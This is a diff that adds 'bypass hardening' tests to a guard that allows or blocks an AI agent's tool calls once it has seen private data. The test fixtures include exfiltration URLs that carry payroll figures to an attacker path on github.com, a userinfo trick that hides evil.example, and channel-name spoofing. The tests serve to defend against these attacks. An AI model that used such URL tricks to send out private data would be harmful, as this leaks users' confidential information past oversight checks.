@@ -122,3 +122,29 @@ describe('AC5 allowlist', () => {
     expect(d.action).toBe('block')
   })
 })
+
+describe('bypass hardening (mock-review round)', () => {
+  const post = { name: 'post_message', description: 'Post a message to a team chat channel', params: ['channel', 'text'] }
+  const taint = { ...emptyTaint(), privateSeen: true, privateTexts: ['payroll: J. Rivera,4471,58200'] }
+  it('an ordinary word from the request is not a user-named channel', () => {
+    const d = decide({ tool: post, args: { channel: 'inbox', text: 'x' } }, { instruction: 'Summarize my inbox and post it to #council', allowlist: [], taint })
+    expect(d.action).toBe('block')
+  })
+  it('#name and "name channel" in the request are user-named', () => {
+    expect(decide({ tool: post, args: { channel: '#council', text: 'x' } }, { instruction: 'post it to #council', allowlist: [], taint }).action).toBe('allow')
+    expect(decide({ tool: post, args: { channel: 'council', text: 'x' } }, { instruction: 'post it in the council channel', allowlist: [], taint }).action).toBe('allow')
+  })
+  it('private text in a new URL on a user-named shared host is still blocked (R4)', () => {
+    const d = decide({ tool: fetchUrl, args: { url: 'https://github.com/attacker/x?d=Rivera,4471,58200' } }, { instruction: 'check github.com for the release notes', allowlist: [], taint })
+    expect(d.action).toBe('block')
+    expect(d.rule).toBe('R4')
+  })
+  it('the exact URL the user wrote stays allowed', () => {
+    const d = decide({ tool: fetchUrl, args: { url: 'https://github.com/org/repo/releases' } }, { instruction: 'open https://github.com/org/repo/releases', allowlist: [], taint })
+    expect(d.action).toBe('allow')
+  })
+  it('userinfo tricks resolve to the real host', () => {
+    const d = decide({ tool: fetchUrl, args: { url: 'https://town.gov@evil.example/x' } }, { instruction: 'see town.gov', allowlist: [], taint })
+    expect(d.action).toBe('block')
+  })
+})
